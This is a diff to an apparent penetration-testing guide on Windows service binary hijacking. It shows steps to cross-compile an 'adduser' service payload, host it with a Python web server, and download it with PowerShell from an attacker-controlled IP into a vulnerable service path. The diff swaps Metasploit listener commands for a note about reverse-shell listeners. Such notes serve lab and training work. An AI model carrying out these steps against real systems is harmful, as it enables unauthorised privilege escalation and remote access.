@@ -50,16 +50,12 @@ On kali, cross-compile the service:
 ```batch
 x86_64-w64-mingw32-gcc adduser.c -o service.exe
 ```
-# Configure webserver to host file for transfer and listener for meterpreter shell
+# Configure webserver to host file for transfer
 ```bash
 python -m http.server 80
 ```
-```bash
-msfconsole
-```
-```bash
-use exploit/multi/handler
-```
+Remember to set up a listener if the service payload is a revshell!
+
 Transfer file to target machine at the vulnerable service path:
 ```powershell
 iwr -uri http://$(IP_ADDRESS)/service.exe -Outfile "C:\Vulnerable\Service\Path.exe"
